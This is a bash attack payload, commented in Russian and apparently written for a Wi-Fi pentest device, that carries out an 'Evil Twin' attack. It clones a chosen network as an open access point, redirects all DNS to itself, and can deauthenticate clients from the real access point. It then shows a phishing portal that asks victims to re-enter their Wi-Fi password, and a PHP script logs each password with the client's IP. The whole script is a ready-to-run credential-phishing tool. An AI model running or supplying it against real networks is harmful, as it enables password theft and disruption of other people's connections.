#!/bin/bash
# Title: Злой двойник (Evil Twin)
# Author: bad-antics
# Description: Клонирует целевую сеть и перехватывает учётные данные
# Category: nullsec/attack

# FIX: правильный PATH для работы из UI
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH

# FIX: подстановка UI-функций, если их нет в окружении
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Нажмите Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ОШИБКА: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Готово"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Выбор (по умолч. $2): " choice; echo "${choice:-$2}"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Подтвердить? (y/n): " confirm; [ "$confirm" = "y" ] && echo "$DUCKYSCRIPT_USER_CONFIRMED" || echo "$DUCKYSCRIPT_REJECTED"; }
# Константы для подтверждения
DUCKYSCRIPT_USER_CONFIRMED=0
DUCKYSCRIPT_REJECTED=1
DUCKYSCRIPT_CANCELLED=2

# Автоопределение интерфейса (экспортирует $IFACE)
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/eviltwin"
mkdir -p "$LOOT_DIR"

PROMPT "АТАКА «ЗЛОЙ ДВОЙНИК»

Клонирует легитимную сеть
и перехватывает данные.

1. Сканирует цели
2. Создаёт идентичную точку доступа
3. Отключает реальных клиентов
4. Перехватывает попытки входа

Нажмите OK для настройки."

SPINNER_START "Сканирование сетей..."
timeout 12 airodump-ng $IFACE --write-interval 1 -w /tmp/twinscan --output-format csv 2>/dev/null
SPINNER_STOP

NET_COUNT=$(grep -c "WPA\|WEP\|OPN" /tmp/twinscan*.csv 2>/dev/null || echo 0)

PROMPT "Найдено $NET_COUNT сетей

Выберите цель
на следующем экране."

TARGET_NUM=$(NUMBER_PICKER "Клонировать сеть №:" 1)

TARGET_LINE=$(grep "WPA\|WEP\|OPN" /tmp/twinscan*.csv 2>/dev/null | sed -n "${TARGET_NUM}p")
REAL_BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
REAL_CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
TARGET_SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')

PROMPT "ЦЕЛЬ ВЫБРАНА

SSID: $TARGET_SSID
BSSID: $REAL_BSSID
Канал: $REAL_CHANNEL

Нажмите OK для настройки
параметров атаки."

DEAUTH_REAL=$(CONFIRMATION_DIALOG "Отключить реальную точку доступа?

Заставить клиентов
переподключиться к
вашему «Злому двойнику»?")

DURATION=$(NUMBER_PICKER "Длительность (секунд):" 300)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac

CRED_LOG="$LOOT_DIR/twin_$(date +%Y%m%d_%H%M).txt"

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ «ЗЛОЙ ДВОЙНИК»?

Клон: $TARGET_SSID
Отключить реальную: $([ "$DEAUTH_REAL" = "$DUCKYSCRIPT_USER_CONFIRMED" ] && echo Да || echo Нет)
Длительность: ${DURATION} с

Нажмите OK для атаки.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

killall hostapd dnsmasq aireplay-ng 2>/dev/null

# Создание фальшивой точки доступа
cat > /tmp/twin_hostapd.conf << EOF
interface=$IFACE
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$REAL_CHANNEL
auth_algs=1
wpa=0
EOF

# Портальная страница для сбора пароля
mkdir -p /tmp/twin_portal
cat > /tmp/twin_portal/index.html << 'TWINHTML'
<!DOCTYPE html>
<html>
<head>
<title>Вход в WiFi - $TARGET_SSID</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial;background:#f5f5f5;margin:0;padding:20px;}
.container{max-width:400px;margin:50px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
h1{color:#333;text-align:center;}
.warning{background:#fff3cd;border:1px solid #ffc107;padding:10px;margin:15px 0;border-radius:4px;font-size:13px;}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;}
button{width:100%;padding:14px;background:#0066cc;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px;}
</style>
</head>
<body>
<div class="container">
<h1>📶 $TARGET_SSID</h1>
<div class="warning">⚠️ Сессия истекла. Пожалуйста, введите пароль WiFi заново.</div>
<form method="POST" action="/capture.php">
<input type="password" name="password" placeholder="Пароль WiFi" required>
<input type="hidden" name="ssid" value="$TARGET_SSID">
<button type="submit">Подключиться</button>
</form>
</div>
</body>
</html>
TWINHTML

cat > /tmp/twin_portal/capture.php << 'CAPPHP'
<?php
\$log = "/mmc/nullsec/eviltwin/twin_" . date("Ymd_Hi") . ".txt";
\$ts = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];
\$ssid = \$_POST['ssid'] ?? 'Unknown';
\$pass = \$_POST['password'] ?? '';
file_put_contents(\$log, "[\$ts] SSID:\$ssid IP:\$ip PASS:\$pass\n", FILE_APPEND);
header("Location: /success.html");
?>
CAPPHP

cat > /tmp/twin_portal/success.html << 'SUCCESSHTML'
<!DOCTYPE html>
<html><head><title>Подключено</title>
<style>body{font-family:Arial;text-align:center;padding:50px;}.ok{color:#4caf50;font-size:60px;}</style>
</head><body>
<div class="ok">✓</div>
<h1>Подключено!</h1>
<p>Переподключение к сети...</p>
</body></html>
SUCCESSHTML

LOG "Запуск «Злого двойника»..."

# Запуск фальшивой AP
hostapd /tmp/twin_hostapd.conf &
sleep 2
ifconfig $IFACE 10.0.0.1 netmask 255.255.255.0 up

# Перенаправление DNS
cat > /tmp/twin_dns.conf << EOF
interface=$IFACE
dhcp-range=10.0.0.10,10.0.0.100,5m
address=/#/10.0.0.1
EOF
dnsmasq -C /tmp/twin_dns.conf &

# Веб-сервер (PHP)
cd /tmp/twin_portal
php -S 10.0.0.1:80 &

# Опциональная деаутентификация реальной точки доступа
if [ "$DEAUTH_REAL" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "Отключение реальной точки доступа..."
    aireplay-ng -0 0 -a "$REAL_BSSID" $IFACE &
fi

LOG "«Злой двойник» активен: $TARGET_SSID"

sleep $DURATION

# Очистка
killall hostapd dnsmasq php aireplay-ng 2>/dev/null

CRED_COUNT=$(wc -l < "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "АТАКА «ЗЛОЙ ДВОЙНИК» ЗАВЕРШЕНА

Клон: $TARGET_SSID
Длительность: ${DURATION} с
Собрано данных: $CRED_COUNT

Лог: $CRED_LOG

Нажмите OK для выхода."

